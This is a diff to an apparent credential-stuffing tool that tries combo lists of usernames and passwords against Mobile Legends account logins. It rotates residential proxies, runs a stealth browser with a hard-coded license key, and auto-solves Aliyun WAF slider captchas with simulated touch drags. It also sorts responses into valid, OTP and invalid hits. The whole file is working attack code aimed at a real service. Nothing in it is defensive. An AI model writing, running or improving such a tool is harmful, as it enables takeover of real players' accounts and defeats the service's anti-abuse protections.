@@ -42,8 +42,10 @@ if _popped_cwd:
 # Global emergency PID tracker to prevent zombie processes (Cross-platform: Windows/Linux/Termux)
 _driver_pid = None
 _pw_instance = None
+_lookup_exec = None
 
 CLOAKBROWSER_LICENSE_KEY_DEFAULT = "cb_796b6fadb4cd45c79d7b27a458e7634f"
+_CONFIGURED_LICENSE_KEY = ""
 _ACTIVE_LICENSE_KEY = ""
 _LICENSE_SESSION_ACTIVE = False
 
@@ -56,8 +58,10 @@ def _cloak_cache_dir() -> str:
 
 def activate_cloak_license(explicit_key: str = "") -> str:
     """Aktifkan license key CloakBrowser secara ephemeral untuk sesi run ini saja."""
-    global _ACTIVE_LICENSE_KEY, _LICENSE_SESSION_ACTIVE
-    key = (explicit_key or os.environ.get("CLOAKBROWSER_LICENSE_KEY", "") or CLOAKBROWSER_LICENSE_KEY_DEFAULT).strip()
+    global _CONFIGURED_LICENSE_KEY, _ACTIVE_LICENSE_KEY, _LICENSE_SESSION_ACTIVE
+    if explicit_key and explicit_key.strip():
+        _CONFIGURED_LICENSE_KEY = explicit_key.strip()
+    key = (_CONFIGURED_LICENSE_KEY or os.environ.get("CLOAKBROWSER_LICENSE_KEY", "") or CLOAKBROWSER_LICENSE_KEY_DEFAULT).strip()
     if key:
         _ACTIVE_LICENSE_KEY = key
         os.environ["CLOAKBROWSER_LICENSE_KEY"] = key
@@ -87,20 +91,21 @@ def _acquire_instance_lock():
     try:
         if os.name == 'nt':
             import msvcrt
-            fh.seek(0)
+            # Lock byte offset 1024 so offset 0 stays readable by another instance for PID reporting
+            fh.seek(1024)
             msvcrt.locking(fh.fileno(), msvcrt.LK_NBLCK, 1)
         else:
             import fcntl
             fcntl.flock(fh.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
         fh.seek(0)
         fh.truncate()
-        fh.write(str(os.getpid()))
+        fh.write(f"{os.getpid():<16}")
         fh.flush()
         return fh
     except Exception:
         try:
             fh.seek(0)
-            old_pid = fh.read().strip()
+            old_pid = fh.read(64).strip() or "?"
         except Exception:
             old_pid = "?"
         fh.close()
@@ -112,7 +117,7 @@ def _release_instance_lock(fh):
     try:
         if os.name == 'nt':
             import msvcrt
-            fh.seek(0)
+            fh.seek(1024)
             msvcrt.locking(fh.fileno(), msvcrt.LK_UNLCK, 1)
         else:
             import fcntl
@@ -124,21 +129,30 @@ def _release_instance_lock(fh):
     except Exception:
         pass
 
-def _emergency_cleanup():
+def _kill_driver_tree():
+    """Terminate tracked driver/browser PID tree without withdrawing active license mid-run."""
     global _driver_pid
     if _driver_pid:
         try:
             if os.name == 'nt':
-                subprocess.run(f"taskkill /F /T /PID {_driver_pid}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                subprocess.run(["taskkill", "/F", "/T", "/PID", str(_driver_pid)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             else:
                 try:
-                    os.killpg(os.getpgid(_driver_pid), signal.SIGKILL)
+                    pgid = os.getpgid(_driver_pid)
+                    if pgid != os.getpgrp():
+                        os.killpg(pgid, signal.SIGKILL)
+                    else:
+                        subprocess.run(["pkill", "-P", str(_driver_pid), "-9"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                        os.kill(_driver_pid, signal.SIGKILL)
                 except Exception:
-                    subprocess.run(f"kill -9 {_driver_pid} 2>/dev/null", shell=True)
-                    subprocess.run(f"pkill -P {_driver_pid} -9 2>/dev/null", shell=True)
+                    subprocess.run(["pkill", "-P", str(_driver_pid), "-9"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                    subprocess.run(["kill", "-9", str(_driver_pid)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         except Exception:
             pass
         _driver_pid = None
+
+def _emergency_cleanup():
+    _kill_driver_tree()
     if _LICENSE_SESSION_ACTIVE:
         withdraw_cloak_license()
 
@@ -674,6 +688,9 @@ async def send_tg(text: str):
     except Exception:
         pass
 
+def _norm_combo_key(u: str, p: str) -> str:
+    return f"{u.strip().lower()}:{p}"
+
 def load_done() -> set[str]:
     """Resume: kumpulkan pasangan user:pass yang sudah selesai dari output files."""
     done = set()
@@ -686,7 +703,10 @@ def load_done() -> set[str]:
                         line = line.strip()
                         if line and not line.startswith('#'):
                             up = line.split('|', 1)[0].strip()
-                            if up:
+                            if ':' in up:
+                                cu, cp = up.split(':', 1)
+                                done.add(_norm_combo_key(cu, cp))
+                            elif up:
                                 done.add(up.lower())
             except Exception:
                 pass
@@ -709,7 +729,7 @@ def load_combos(path: str) -> list[tuple[str, str]]:
                 u, p = u.strip(), p.strip()
             else:
                 u = p = ln.strip()
-            k = f"{u}:{p}".lower()
+            k = _norm_combo_key(u, p)
             if k not in seen:
                 seen.add(k)
                 out.append((u, p))
@@ -934,7 +954,8 @@ def rotated_user(base_user: str, server: str = '', session_id: str = '') -> dict
         _TUNNEL_BLACKLIST.clear()
         pool = list(DATAIMPULSE_REGIONS) or ['sg', 'my']  # ultimate fallback
     if session_id:
-        fast_pool = [r for r in DATAIMPULSE_REGIONS if r not in _TUNNEL_BLACKLIST] or pool
+        explicit_regs = [r for r in regions if r not in _TUNNEL_BLACKLIST]
+        fast_pool = explicit_regs or [r for r in DATAIMPULSE_REGIONS if r not in _TUNNEL_BLACKLIST] or pool
         idx = zlib.crc32(session_id.encode('utf-8')) % len(fast_pool)
         reg = fast_pool[idx]
     else:
@@ -1012,16 +1033,20 @@ def parse_proxy(raw: str):
             port = int(parts[1])
             user = parts[2]
         elif len(parts) >= 4:
-            if parts[1].isdigit():
-                host = parts[0]
-                port = int(parts[1])
-                user = parts[2]
-                pwd = ':'.join(parts[3:])
-            elif parts[3].isdigit():
+            p3_ok = parts[3].isdigit() and (1 <= int(parts[3]) <= 65535)
+            p1_ok = parts[1].isdigit() and (1 <= int(parts[1]) <= 65535)
+            p0_host = ('.' in parts[0] or parts[0].lower() == 'localhost')
+            p2_host = ('.' in parts[2] or parts[2].lower() == 'localhost')
+            if p3_ok and (p2_host or not p1_ok or not p0_host):
                 user = parts[0]
                 pwd = parts[1]
                 host = parts[2]
                 port = int(parts[3])
+            elif p1_ok:
+                host = parts[0]
+                port = int(parts[1])
+                user = parts[2]
+                pwd = ':'.join(parts[3:])
             else:
                 return None
 
@@ -1096,33 +1121,42 @@ async def _probe_proxy_ms(proxy: dict) -> tuple[bool, str, int]:
                     return r.status_code, int((time.perf_counter() - t0) * 1000)
                 except ImportError:
                     import socket
+                    import ssl
                     creds_part, hp_part = (proxy_url.split('://', 1)[1].rsplit('@', 1) if '@' in proxy_url else ('', proxy_url.split('://', 1)[1]))
                     hp = hp_part.split('/', 1)[0].rsplit(':', 1)
                     with socket.create_connection((hp[0].strip('[]'), int(hp[1])), timeout=PROXY_API_PROBE_TIMEOUT) as s:
                         s.settimeout(PROXY_API_PROBE_TIMEOUT)
                         host_b = b'accountmtapi.mobilelegends.com'
+                        u_b = urllib.parse.unquote(creds_part.split(':', 1)[0]).encode()[:255] if creds_part else b''
                         if proxy_url.lower().startswith('socks4'):
-                            u_b = urllib.parse.unquote(creds_part.split(':', 1)[0]).encode()[:255] if creds_part else b''
                             s.sendall(b'\x04\x01\x01\xbb\x00\x00\x00\x01' + u_b + b'\x00' + host_b + b'\x00')
                             cr = s.recv(8)
                             if len(cr) < 2 or cr[1] != 0x5A:
                                 raise RuntimeError("Tunnel connection failed")
-                            return 200, int((time.perf_counter() - t0) * 1000)
-                        u_b = urllib.parse.unquote(creds_part.split(':', 1)[0]).encode()[:255] if creds_part else b''
-                        p_b = urllib.parse.unquote(creds_part.split(':', 1)[1]).encode()[:255] if ':' in creds_part else b''
-                        s.sendall(b'\x05\x02\x00\x02' if u_b else b'\x05\x01\x00')
-                        m = s.recv(2)
-                        if len(m) < 2 or m[0] != 5 or m[1] == 0xFF:
-                            raise RuntimeError("SOCKS5 handshake rejected")
-                        if m[1] == 2:
-                            s.sendall(b'\x01' + bytes([len(u_b)]) + u_b + bytes([len(p_b)]) + p_b)
-                            ar = s.recv(2)
-                            if len(ar) < 2 or ar[1] != 0:
-                                raise RuntimeError("407 TRAFFIC_EXHAUSTED")
-                        s.sendall(b'\x05\x01\x00\x03' + bytes([len(host_b)]) + host_b + b'\x01\xbb')
-                        cr = s.recv(10)
-                        if len(cr) < 2 or cr[1] != 0:
-                            raise RuntimeError("Tunnel connection failed")
+                        else:
+                            p_b = urllib.parse.unquote(creds_part.split(':', 1)[1]).encode()[:255] if ':' in creds_part else b''
+                            s.sendall(b'\x05\x02\x00\x02' if u_b else b'\x05\x01\x00')
+                            m = s.recv(2)
+                            if len(m) < 2 or m[0] != 5 or m[1] == 0xFF:
+                                raise RuntimeError("SOCKS5 handshake rejected")
+                            if m[1] == 2:
+                                s.sendall(b'\x01' + bytes([len(u_b)]) + u_b + bytes([len(p_b)]) + p_b)
+                                ar = s.recv(2)
+                                if len(ar) < 2 or ar[1] != 0:
+                                    raise RuntimeError("407 TRAFFIC_EXHAUSTED")
+                            s.sendall(b'\x05\x01\x00\x03' + bytes([len(host_b)]) + host_b + b'\x01\xbb')
+                            cr = s.recv(10)
+                            if len(cr) < 2 or cr[1] != 0:
+                                raise RuntimeError("Tunnel connection failed")
+                        ctx_ssl = ssl.create_default_context()
+                        with ctx_ssl.wrap_socket(s, server_hostname='accountmtapi.mobilelegends.com') as ss:
+                            ss.settimeout(PROXY_API_PROBE_TIMEOUT)
+                            ss.sendall(b'HEAD / HTTP/1.1\r\nHost: accountmtapi.mobilelegends.com\r\nConnection: close\r\n\r\n')
+                            head_raw = ss.recv(256).decode('ascii', errors='ignore')
+                            first_line = head_raw.split('\r\n', 1)[0]
+                            parts_h = first_line.split()
+                            if len(parts_h) >= 2 and parts_h[1].isdigit():
+                                return int(parts_h[1]), int((time.perf_counter() - t0) * 1000)
                         return 200, int((time.perf_counter() - t0) * 1000)
             handler = urllib.request.ProxyHandler({'http': proxy_url, 'https': proxy_url})
             opener = urllib.request.build_opener(handler)
@@ -1223,9 +1257,8 @@ async def test_proxies(raw_proxies, browser=None, concurrency=16):
         if len(fast_ccs) >= 12:
             break
     if len(fast_ccs) >= 1:
-        # ponytail: prioritaskan region tercepat namun pertahankan minimal 4 fallback agar tidak habis saat 1 region ter-blacklist
         merged_ccs = fast_ccs + [r for r in DATAIMPULSE_REGIONS if r not in fast_ccs and r not in _TUNNEL_BLACKLIST]
-        DATAIMPULSE_REGIONS[:] = merged_ccs[:max(len(fast_ccs), min(4, len(merged_ccs)))]
+        DATAIMPULSE_REGIONS[:] = merged_ccs
 
     good = [(raw, p) for _, _, raw, p in fast]
     p_out(
@@ -1279,7 +1312,13 @@ async def _human_drag(page, ctx, sx, sy, dist):
         await _touch(cdp, "touchEnd", sx + dist, sy, keep=True)
         return True
     except Exception as e:
+        old_cdp = getattr(page, '_touch_cdp', None)
         page._touch_cdp = None
+        if old_cdp is not None:
+            try:
+                await old_cdp.detach()
+            except Exception:
+                pass
         dbg(f"drag err: {e}")
         return False
 
@@ -1317,7 +1356,8 @@ async def solve_waf(page, ctx) -> bool:
                 const tr = track ? track.getBoundingClientRect() : r;
                 const inner = (track && track.clientWidth) ? track.clientWidth : tr.width;
                 const sw = s.offsetWidth || r.width;
-                return { x: r.x, y: r.y, w: r.width, h: r.height, mt: Math.max(60, Math.ceil(inner - sw)) };
+                const rawMt = Math.ceil(inner - sw);
+                return { x: r.x, y: r.y, w: r.width, h: r.height, mt: rawMt > 20 ? rawMt : 185 };
             }""")
         except Exception:
             box = None
@@ -1347,7 +1387,8 @@ async def solve_waf(page, ctx) -> bool:
                     return v(blk) || v(s);
                 }""")
             except Exception:
-                still = False
+                still = True
+                break
             if not still:
                 break
         if not still:
@@ -1375,13 +1416,13 @@ async def launch_browser_smart(headless=True, humanize=False):
         '--no-sandbox',
         '--mute-audio',
     ]
-    for _try in range(2):
+    for _try in range(3):
         try:
             lic_key = _ACTIVE_LICENSE_KEY or activate_cloak_license()
             # ponytail: keep CloakBrowser Pro native stealth intact while avoiding Playwright mouse-hook jitter on multi-worker touch drag
             b = await asyncio.wait_for(
                 launch_async(headless=headless, humanize=humanize, license_key=lic_key or None),
-                timeout=20.0,
+                timeout=25.0,
             )
             if not _TUI_ACTIVE: p_out(f"{c(GREEN)}[*] CloakBrowser Pro siap ✓{W}")
             try:
@@ -1389,11 +1430,14 @@ async def launch_browser_smart(headless=True, humanize=False):
             except Exception:
                 pass
             return b
-        except Exception as e:
+        except BaseException as e:
+            if isinstance(e, asyncio.CancelledError):
+                raise
             if 'session limit' in str(e).lower():
-                if _try == 0:
-                    dbg("CloakBrowser Pro session limit -> tunggu 10s sebelum retry...")
-                    await asyncio.sleep(10.0)
+                if _try < 2:
+                    wait_s = 10.0 if _try == 0 else 15.0
+                    dbg(f"CloakBrowser Pro session limit -> tunggu {int(wait_s)}s sebelum retry...")
+                    await asyncio.sleep(wait_s)
                     continue
                 if not _TUI_ACTIVE:
                     p_out(f"\n  {c(RED)}[!] CloakBrowser Pro: session limit reached!{W}")
@@ -1407,18 +1451,30 @@ async def launch_browser_smart(headless=True, humanize=False):
     from playwright.async_api import async_playwright
     pw = await async_playwright().start()
     _pw_instance = pw
+    try:
+        _driver_pid = pw._impl_obj._connection._transport._proc.pid
+    except Exception:
+        pass
     if headless:
         c_args.append('--headless=new')
     try:
-        b = await pw.chromium.launch(channel='chrome', headless=headless, args=c_args)
-    except Exception:
-        b = await pw.chromium.launch(headless=headless, args=c_args)
-    if not _TUI_ACTIVE: p_out(f"{c(GOLD)}[*] Chrome Playwright fallback aktif (non-stealth){W}")
-    try:
-        _driver_pid = b._impl_obj._connection._transport._proc.pid
-    except Exception:
-        pass
-    return b
+        try:
+            b = await pw.chromium.launch(channel='chrome', headless=headless, args=c_args)
+        except Exception:
+            b = await pw.chromium.launch(headless=headless, args=c_args)
+        if not _TUI_ACTIVE: p_out(f"{c(GOLD)}[*] Chrome Playwright fallback aktif (non-stealth){W}")
+        try:
+            _driver_pid = b._impl_obj._connection._transport._proc.pid
+        except Exception:
+            pass
+        return b
+    except BaseException:
+        try:
+            await asyncio.wait_for(pw.stop(), timeout=3.0)
+        except Exception:
+            _kill_driver_tree()
+        _pw_instance = None
+        raise
 
 # ── Fast Direct HTTP POST in Verified Browser Session ───────────────────────
 def build_login_payload(user: str, passw: str) -> dict:
@@ -1482,9 +1538,26 @@ async def do_fast_http_post(page, user: str, passw: str, wid: int = 0) -> tuple[
 # ── Core Browser Login via Manual Form Typing ────────────────────────────────
 async def do_login_via_browser(page, ctx, user: str, passw: str, wid: int = 0, waf_lock: asyncio.Lock | None = None) -> tuple[str, dict]:
     """Submit form dan tangkap respons login menggunakan Direct Vue Bridge + Fallback Natural Typing."""
-    api_result = {"json": None, "raw": None, "had_waf": False, "proxy_err": False}
+    api_result = {"json": None, "raw": None, "had_waf": False, "proxy_err": False, "proxy_407": False}
     resp_event = asyncio.Event()
-    captured_responses = []
+    req_sent = asyncio.Event()
+
+    def on_req(req):
+        if req.method == 'POST' and ('mpass' in req.url or 'accountmtapi' in req.url):
+            try:
+                post_raw = req.post_data or ''
+                if post_raw:
+                    pd = json.loads(post_raw)
+                    sent_op = pd.get('op', '')
+                    if sent_op and sent_op != 'new_login_pwd':
+                        return
+                    p_obj = pd.get('params') if isinstance(pd.get('params'), dict) else {}
+                    sent_acct = p_obj.get('account') or pd.get('account') or pd.get('email') or ''
+                    if sent_acct and str(sent_acct).strip().lower() != user.strip().lower():
+                        return
+                req_sent.set()
+            except Exception:
+                req_sent.set()
 
     async def on_resp(resp):
         if 'mpass' in resp.url or 'accountmtapi' in resp.url:
@@ -1504,26 +1577,35 @@ async def do_login_via_browser(page, ctx, user: str, passw: str, wid: int = 0, w
                             return
                     except Exception:
                         pass
+                # Check HTTP status BEFORE resp.text() so empty/aborted 405/407/5xx never hang 12s
+                if resp.status == 407:
+                    api_result["proxy_err"] = True
+                    api_result["proxy_407"] = True
+                    resp_event.set()
+                    return
+                if resp.status == 405:
+                    api_result["had_waf"] = True
+                    resp_event.set()
+                    return
+                if resp.status == 429 or resp.status >= 500:
+                    api_result["proxy_err"] = True
+                    resp_event.set()
+                    return
                 body = await resp.text()
-                # Strip BOM (U+FEFF) dan whitespace sebelum deteksi JSON
-                # tanpa ini response dengan BOM/leading-space terlewat sepenuhnya
                 body_stripped = body.strip().lstrip('\ufeff').strip()
                 body_low = body_stripped.lower()
-                if resp.status == 405 or (not body_stripped.startswith('{') and any(k in body_low for k in ('aliyun', 'waf', 'captcha', '<html'))):
+                if not body_stripped.startswith('{') and any(k in body_low for k in ('aliyun', 'waf', 'captcha', '<html')):
                     api_result["had_waf"] = True
                     resp_event.set()
                 elif body_stripped.startswith('{'):
                     j = json.loads(body_stripped)
-                    captured_responses.append((resp.status, j))
                     if j.get('code') is not None:
                         api_result["json"] = j
                         resp_event.set()
-                elif resp.status == 429 or resp.status >= 500:
-                    api_result["proxy_err"] = True
-                    resp_event.set()
             except Exception:
                 pass
 
+    page.on("request", on_req)
     page.on("response", on_resp)
     try:
         # 1. Langsung tembak Vue XHR tanpa wait_for_selector IPC roundtrip (fallback wait jika DOM hilang)
@@ -1555,6 +1637,18 @@ async def do_login_via_browser(page, ctx, user: str, passw: str, wid: int = 0, w
             if (formComp.emailerror || formComp.passworderror) return 'CLIENT_INVALID';
             return 'OK';
         }"""
+        _client_err_js = """() => {
+            let el = document.querySelector('.content-but');
+            while (el) {
+                if (el.__vue__) {
+                    if (el.__vue__.emailerror || el.__vue__.passworderror) return true;
+                    break;
+                }
+                el = el.parentElement;
+            }
+            const errEl = document.querySelector('.error-tip, .el-form-item__error, [class*="error"]');
+            return !!(errEl && errEl.getBoundingClientRect().width > 0 && (errEl.textContent || '').trim().length > 0);
+        }"""
         vue_res = await page.evaluate(_vue_js, [user, passw])
         if vue_res == 'CLIENT_INVALID':
             return 'INVALID', {'message': 'Client_InvalidLengthOrFormat'}
@@ -1568,7 +1662,7 @@ async def do_login_via_browser(page, ctx, user: str, passw: str, wid: int = 0, w
                         ok_w = await solve_waf(page, ctx)
                 else:
                     ok_w = await solve_waf(page, ctx)
-                if not ok_w:
+                if not ok_w or LOGIN_PAGE.split('?', 1)[0] not in (page.url or ''):
                     await page.goto(LOGIN_PAGE, wait_until="domcontentloaded", timeout=12000)
                 await page.wait_for_selector('input[type="password"]', timeout=5000)
             vue_res = await page.evaluate(_vue_js, [user, passw])
@@ -1580,9 +1674,8 @@ async def do_login_via_browser(page, ctx, user: str, passw: str, wid: int = 0, w
             inputs = await page.query_selector_all('input')
             if len(inputs) < 2:
                 return 'ERR', {'message': 'input_elements_not_found'}
-            # Field username: click → settle → clear → type
             await inputs[0].click()
-            await asyncio.sleep(0.08)   # tunggu focus benar-benar pindah
+            await asyncio.sleep(0.08)
             await page.evaluate("el => el.value = ''", inputs[0])
             for ch in user:
                 await page.keyboard.type(ch)
@@ -1595,13 +1688,11 @@ async def do_login_via_browser(page, ctx, user: str, passw: str, wid: int = 0, w
                 }
             }''')
             await asyncio.sleep(0.05)
-            # Field password: click → settle → clear → type
-            # inputs[1] bisa stale setelah DOM update — re-query
             pwd_input = await page.query_selector('input[type="password"]')
             if not pwd_input:
                 pwd_input = inputs[1]
             await pwd_input.click()
-            await asyncio.sleep(0.08)   # tunggu focus benar-benar pindah ke password
+            await asyncio.sleep(0.08)
             await page.evaluate("el => el.value = ''", pwd_input)
             for ch in passw:
                 await page.keyboard.type(ch)
@@ -1618,11 +1709,36 @@ async def do_login_via_browser(page, ctx, user: str, passw: str, wid: int = 0, w
             if btn: await btn.click()
             else: await page.keyboard.press('Enter')
 
-        # 3. Event-driven wait up to 12s (wakes immediately on fast JSON, 405 WAF, or HTTP 429/5xx)
+        # 3. Fast client-validation check: axios/POST keluar <50ms secara lokal bila valid; bila 2.0s nihil & bukan slider -> rule ditolak Vue
+        if not req_sent.is_set() and not resp_event.is_set():
+            try:
+                await asyncio.wait_for(req_sent.wait(), timeout=2.0)
+            except asyncio.TimeoutError:
+                pass
+        if not req_sent.is_set() and not resp_event.is_set() and not api_result["json"] and not api_result["had_waf"] and not api_result["proxy_err"]:
+            is_c_err = False
+            has_sl_now = True
+            try:
+                is_c_err = await page.evaluate(_client_err_js)
+                if not is_c_err and vue_submitted:
+                    has_sl_now = await page.evaluate("""() => {
+                        const v = el => !!(el && el.getBoundingClientRect().width > 0 && getComputedStyle(el).display !== 'none' && getComputedStyle(el).visibility !== 'hidden');
+                        const s = document.getElementById('aliyunCaptcha-sliding-slider') || document.querySelector('.btn_slide') || document.querySelector('[id*="sliding-slider"]');
+                        const b = document.getElementById('waf_nc_block') || document.getElementById('WAF_NC_WRAPPER');
+                        return v(s) || v(b);
+                    }""")
+            except Exception:
+                pass
+            if is_c_err or (vue_submitted and not has_sl_now):
+                return 'INVALID', {'message': 'Client_InvalidPasswordRule'}
+
+        # Event-driven wait up to 12s (wakes immediately on fast JSON, 405 WAF, or HTTP 407/429/5xx)
         try:
             await asyncio.wait_for(resp_event.wait(), timeout=12.0)
         except asyncio.TimeoutError:
             pass
+        if api_result["proxy_407"] and not api_result["json"]:
+            return 'ERR', {'message': '407_TRAFFIC_EXHAUSTED', 'proxy_407': True}
         if api_result["proxy_err"] and not api_result["had_waf"] and not api_result["json"]:
             return 'ERR', {'message': 'PROXY_HTTP_ERR'}
 
@@ -1663,16 +1779,31 @@ async def do_login_via_browser(page, ctx, user: str, passw: str, wid: int = 0, w
                 except asyncio.TimeoutError:
                     pass
                 if not api_result["json"] and not api_result["had_waf"]:
+                    req_sent.clear()
                     if vue_submitted:
-                        await page.evaluate(_vue_js, [user, passw])
+                        r2 = await page.evaluate(_vue_js, [user, passw])
+                        if r2 == 'CLIENT_INVALID':
+                            return 'INVALID', {'message': 'Client_InvalidLengthOrFormat'}
                     else:
                         btn = await page.query_selector('.content-but')
                         if btn:
                             await btn.click()
                     try:
+                        await asyncio.wait_for(req_sent.wait(), timeout=1.5)
+                    except asyncio.TimeoutError:
+                        pass
+                    if not req_sent.is_set() and not resp_event.is_set() and not api_result["json"] and not api_result["had_waf"] and not api_result["proxy_err"]:
+                        try:
+                            if await page.evaluate(_client_err_js):
+                                return 'INVALID', {'message': 'Client_InvalidPasswordRule'}
+                        except Exception:
+                            pass
+                    try:
                         await asyncio.wait_for(resp_event.wait(), timeout=10.0)
                     except asyncio.TimeoutError:
                         pass
+                if api_result["proxy_407"] and not api_result["json"]:
+                    return 'ERR', {'message': '407_TRAFFIC_EXHAUSTED', 'proxy_407': True}
                 if api_result["proxy_err"] and not api_result["had_waf"] and not api_result["json"]:
                     return 'ERR', {'message': 'PROXY_HTTP_ERR'}
                 if api_result["json"]:
@@ -1682,6 +1813,12 @@ async def do_login_via_browser(page, ctx, user: str, passw: str, wid: int = 0, w
         if not res_json:
             if api_result["had_waf"] or drag_count > 0:
                 return 'WAF', {'message': 'waf_challenge_unsolved'}
+            if not req_sent.is_set():
+                try:
+                    if await page.evaluate(_client_err_js):
+                        return 'INVALID', {'message': 'Client_InvalidPasswordRule'}
+                except Exception:
+                    pass
             return 'ERR', {'message': 'timeout_waiting_response'}
 
         # 4. Dekripsi data jika terenkripsi (VALID / OTP)
@@ -1702,40 +1839,102 @@ async def do_login_via_browser(page, ctx, user: str, passw: str, wid: int = 0, w
         dbg(f"w{wid} login error: {e}")
         return 'ERR', {'message': str(e)}
     finally:
-        try:
-            page.remove_listener("response", on_resp)
-        except Exception:
-            pass
+        for ev_n, fn in (("request", on_req), ("response", on_resp)):
+            try:
+                page.remove_listener(ev_n, fn)
+            except Exception:
+                pass
 
 _STATIC_CACHE = {}  # url -> (status, headers, body_bytes)
+_CACHE_LOCKS: dict[str, asyncio.Lock] = {}
+_PROXY_FAILS: dict[tuple[str, str], int] = {}
+
+_BLOCKED_DOMAINS = (
+    'api.moba5v5.com/r',
+    'sg-api.mobilelegends.com',
+    'google-analytics',
+    'facebook',
+    'doubleclick',
+)
+
+_ROUTE_RE = re.compile(
+    r'(\.(png|jpe?g|gif|webp|svg|woff2?|ttf|eot|ico|mp4|mp3|js|css)(\?|$)'
+    r'|api\.moba5v5\.com/r|sg-api\.mobilelegends\.com|google-analytics|facebook|doubleclick)',
+    re.I,
+)
+
+def _is_cacheable_static(status: int, headers: dict, body: bytes) -> bool:
+    if status != 200 or not body:
+        return False
+    ct = ''
+    for k, v in headers.items():
+        if k.lower() == 'content-type':
+            ct = str(v).lower()
+            break
+    if 'text/html' in ct:
+        return False
+    head = body.lstrip()[:32].lower()
+    return not head.startswith((b'<html', b'<!doctype', b'<script'))
+
+async def _safe_continue(route):
+    try:
+        await route.continue_()
+    except Exception:
+        pass
 
 async def _route_filter(route):
-    """Abort heavy assets and serve static JS/CSS bundles from RAM cache (0 proxy quota on repeat contexts)."""
+    """Abort heavy/telemetry assets and serve static JS/CSS bundles from RAM cache (0 proxy quota on repeat contexts)."""
     r = route.request
     url = r.url
+    low = (url or '').lower()
     try:
-        if r.resource_type in ("image", "media", "font") or any(d in url for d in ("google-analytics", "facebook", "doubleclick")):
+        if low.startswith(('data:', 'blob:', 'about:')):
+            return await _safe_continue(route)
+        if r.resource_type in ("image", "media", "font") or any(d in low for d in _BLOCKED_DOMAINS):
             return await route.abort()
         path = url.split("?", 1)[0].lower()
         if r.method == "GET" and path.endswith((".js", ".css")):
-            if not any(k in url.lower() for k in ("cf.aliyun", "ynuf.aliapp", "acjs.aliyun", "waf_nc", "accountmtapi", "mpass", "moba5v5")):
+            if not any(k in low for k in ("cf.aliyun", "ynuf.aliapp", "acjs.aliyun", "waf_nc", "accountmtapi", "mpass", "moba5v5")):
                 if url in _STATIC_CACHE:
                     st, hdrs, body = _STATIC_CACHE[url]
                     return await route.fulfill(status=st, headers=hdrs, body=body)
-                try:
-                    resp = await asyncio.wait_for(route.fetch(timeout=8000), timeout=9.0)
-                    body = await asyncio.wait_for(resp.body(), timeout=5.0)
+                if len(_CACHE_LOCKS) >= 256:
+                    for k in list(_CACHE_LOCKS.keys()):
+                        lk = _CACHE_LOCKS[k]
+                        if k not in _STATIC_CACHE and not lk.locked() and not getattr(lk, '_waiters', None):
+                            _CACHE_LOCKS.pop(k, None)
+                            if len(_CACHE_LOCKS) < 192:
+                                break
+                if url not in _CACHE_LOCKS and len(_CACHE_LOCKS) >= 256:
+                    return await _safe_continue(route)
+                lock = _CACHE_LOCKS.setdefault(url, asyncio.Lock())
+                async with lock:
+                    if url in _STATIC_CACHE:
+                        st, hdrs, body = _STATIC_CACHE[url]
+                        return await route.fulfill(status=st, headers=hdrs, body=body)
+                    try:
+                        resp = await asyncio.wait_for(route.fetch(timeout=8000), timeout=9.0)
+                        if resp.status == 407:
+                            return await route.abort()
+                        body = await asyncio.wait_for(resp.body(), timeout=5.0)
+                    except Exception:
+                        return await _safe_continue(route)
                     clean_hdrs = {k: v for k, v in resp.headers.items() if k.lower() not in ('content-encoding', 'content-length', 'transfer-encoding', 'set-cookie')}
-                    if resp.status == 200 and body:
+                    if body:
+                        cl = resp.headers.get('content-length')
+                        ce = (resp.headers.get('content-encoding') or '').lower()
+                        wire_sz = int(cl) if (cl and str(cl).isdigit()) else (max(256, len(body) // 3) if ce else len(body))
+                        stats['bytes_used'] += wire_sz + 450
+                    if _is_cacheable_static(resp.status, clean_hdrs, body):
                         if len(_STATIC_CACHE) >= 128:
                             _STATIC_CACHE.pop(next(iter(_STATIC_CACHE)), None)
                         _STATIC_CACHE[url] = (resp.status, clean_hdrs, body)
+                    if resp.status >= 400:
+                        return await route.abort()
                     return await route.fulfill(status=resp.status, headers=clean_hdrs, body=body)
-                except Exception:
-                    pass
-        return await route.continue_()
+        return await _safe_continue(route)
     except Exception:
-        pass
+        await _safe_continue(route)
 
 # ── Worker Task Loop with Proxy & WAF Isolation ─────────────────────────────
 WAVE_REFRESH_EVERY = 1000
@@ -1752,6 +1951,7 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
     ctx              = None
     page             = None
     page2            = None
+    cur_browser      = browser
     pool             = proxy_pool or ([base_proxy_info] if base_proxy_info else [])
     pool_idx         = (wid + wave_idx * 7) % max(len(pool), 1)
     cur_proxy_info   = pool[pool_idx] if pool else None
@@ -1761,24 +1961,32 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
     ctx_counted      = False
     _acct_retries    = acct_retries if acct_retries is not None else {}
 
+    async def _cleanup_page(p, close_page: bool = False):
+        if p is None:
+            return
+        for attr in ('_net_cdp', '_touch_cdp'):
+            cdp_s = getattr(p, attr, None)
+            if cdp_s is not None:
+                try:
+                    await asyncio.wait_for(cdp_s.detach(), timeout=2.0)
+                except Exception:
+                    pass
+                setattr(p, attr, None)
+        try:
+            await asyncio.wait_for(p.unroute_all(behavior='ignoreErrors'), timeout=2.0)
+        except Exception:
+            pass
+        if close_page:
+            try:
+                await asyncio.wait_for(p.close(), timeout=2.0)
+            except Exception:
+                pass
+
     async def _close_ctx():
         nonlocal ctx, page, page2, slider_cleared, ctx_counted
         try:
             for p in (page2, page):
-                if p is None:
-                    continue
-                for attr in ('_net_cdp', '_touch_cdp'):
-                    cdp_s = getattr(p, attr, None)
-                    if cdp_s is not None:
-                        try:
-                            await cdp_s.detach()
-                        except Exception:
-                            pass
-                        setattr(p, attr, None)
-                try:
-                    await p.unroute_all(behavior='ignoreErrors')
-                except Exception:
-                    pass
+                await _cleanup_page(p, close_page=False)
             if ctx:
                 try:
                     await asyncio.wait_for(ctx.close(), timeout=5.0)
@@ -1802,23 +2010,30 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
             def _on_resp_rx(params):
                 # Only count real remote network traffic (ignore RAM route.fulfill hits where remoteIPAddress is empty)
